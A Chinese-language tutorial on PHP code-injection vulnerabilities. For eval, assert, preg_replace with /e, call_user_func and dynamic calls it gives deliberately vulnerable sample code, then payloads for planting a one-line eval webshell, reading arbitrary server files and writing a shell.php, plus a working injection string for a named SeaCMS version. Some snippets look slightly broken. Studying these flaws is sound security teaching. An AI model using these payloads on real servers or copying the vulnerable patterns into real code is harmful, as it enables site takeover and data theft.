# PHP代码注入

## 原理及成因

RCE

代码执行（注入）

代码执行（注入）类似SQL 注入漏洞，SQLi 是将SQL 语句注入到数据库中执行，而代码执行则是可以把代码注入到应用中最终由服务器运行它。这样的漏洞如果没有特殊的过滤，相当于直接有一个Web 后门的存在。

 

1、程序中含有可以执行PHP 代码的函数或者语言结构

2、传入第一点中的参数，客户端可控，直接修改或者影响

 

## 漏洞危害

Web 应用如果存在执行漏洞是一件非常可怕的事情，可以通过代码执行漏洞继承Web 用户权限，执行任意代码。如果服务器没有正确的配置，Web 用户权限比较高的话，我们可以读写目标服务器任意文件内容，甚至可控制整个网站以及服务器。

本课程以PHP 为例子来说明，代码执行漏洞。

PHP中有很多函数和语句都会造成PHP 代码执行漏洞

 

## 相关函数和语句

### *eval()

eval() 会将字符串当作PHP代码来执行。

测试代码如下

> \-------------------------------------------
>
> <?php
>
> if(isset($_REQUEST['code'])){
>
> @$str=$_REQUEST['code'];
>
> eval($str);
>
> }
>
> ?>
>
> \-----------------------------------------
>
> <?php
>
> if(isset($_GET['code'])){
>
> @$str=$_GET['code'];
>
> eval($str);
>
> }
>
> ?>
>
> \----------------------------------------

提交变量[?code=phpinfo();]

 

我们提交以下参数也是可以的

[?code=${phpinfo()};]

[?code=1;phpinfo();]

 

### *assert()

assert() 同样会作为PHP 代码执行

测试代码如下

> \------------------------
>
> <?php
>
> if(isset($_GET['code'])){
>
> @$str=$_GET['code'];
>
> assert($str);
>
> }
>
> ?>
>
> \--------------------------------------

提交参数 [?code=phpinfo()]

 

### *preg_replace()

preg_replace() 函数作用是对字符串进行正则处理

参数和返回值如下

mixed preg_replace(mixed $pattern,mixed $replacement,mixed $subject[,int limit = -1[,int &$count]])

 

这段代码的含义是搜索$subject 中匹配$pattern 的部分，以$replacement 进行替换，而$pattern处，及第一个参数存在e 修饰时，$replacement 的值会被当成PHP 代码来执行。典型的代码如下

> \-----------------------
>
> <?php
>
> if(isset($_GET['code'])){
>
> @$str=$_GET['code'];
>
> preg_replace("/
>
> (.∗)(.∗)
>
> /e",'\\1',$code);
>
> 
>
> }
>
> ?>
>
> \--------------------------------------

提交参数[?code=[phpinfo()]], phpinfo() 会被执行

 

### *call_user_func()

call_user_func() 等函数都有调用其他函数的功能，其中一个参数作为要调用的函数名，那如果这个传入的函数名可控，那就可以调用以外的函数来执行我们想要的代码，也就是存在任意代码执行漏洞。

以call_user_func() 为例子，该函数的第一个参数作为回调函数，测试代码如下

> \-----------------------
>
> <?php
>
> if(isset($_GET['fun'])){
>
> $fun=$_GET['fun'];
>
> $para=$_GET['para'];
>
> call_user_func($fun,$para);
>
> ?>
>
> \------------------------------------

提交参数[?fun=assert&amp;para=phpinfo()]

 

### *动态函数$a($b)

由于PHP 的特性原因，PHP 的函数支持直接由拼接的方式调用，这导致PHP 再安全上的控制又加大了难度。不少知名程序也用到了动态函数的写法，这种写法跟使用call_user_func() 的初衷一样，用来更加方便的调用函数，但是一旦过滤不严格就会造成代码执行漏洞。

测试代码如下：

> \-----------------------
>
> <?php
>
> if(isset($_GET['a'])){
>
> $a=$_GET['a'];
>
> $b=$_GET['b'];
>
> $a($b);
>
> ?>
>
> \--------------------------------------

提交参数

[?a=assert$b=phpinfo()]

 

## 漏洞利用

代码执行漏洞的利用方式有很多中，

### *直接获取shell

提交参数[?code=@eval($_REQUEST[1])],即可构成一句话木马，密码为[1]。可以使用菜刀连接

### *获取当前文件的绝对路径

__FILE__ 是PHP 预定义常量，其含义为当前文件的路径。提交代码[?code=print(__FILE__);]

### *读文件

我们可以利用file_get_contents() 函数读取服务器任意文件，前提是知道文件的绝对路径(也可是相对路径)和读取权限。

提交代码

[?code=var_dump(file_get_contents('c:\windows\system32\drivers\etc\hosts'));]

右键查看源代码

### *写文件

我们可以利用file_put_contents() 函数写入文件，前提是知道可写文件目录。

提交代码[?code=var_dump(file_put_contents($_POST[1],$_POST[2]));]

此时需要借助与hackbar 通过post 方式提交参数

[1=shel.php&2=<?php phpinfo()?>]

 

即可再当前目录下创建一个文件shell.php

 

## 防御方法

1、尽量不要使用eval(不是函数，是语言结构) 等函数

2、如果使用的话一定要进行严格的过滤

3、preg_replace 放弃使用/e 修饰符

4、修改配置文件

disable_functions=assert

 

## 实战：

Seacmsv6.26 命令执行

漏洞点[?searchtype=5&tid=&area=phpinfo()]

 

6.53 6.54 6.55都存在代码注入漏洞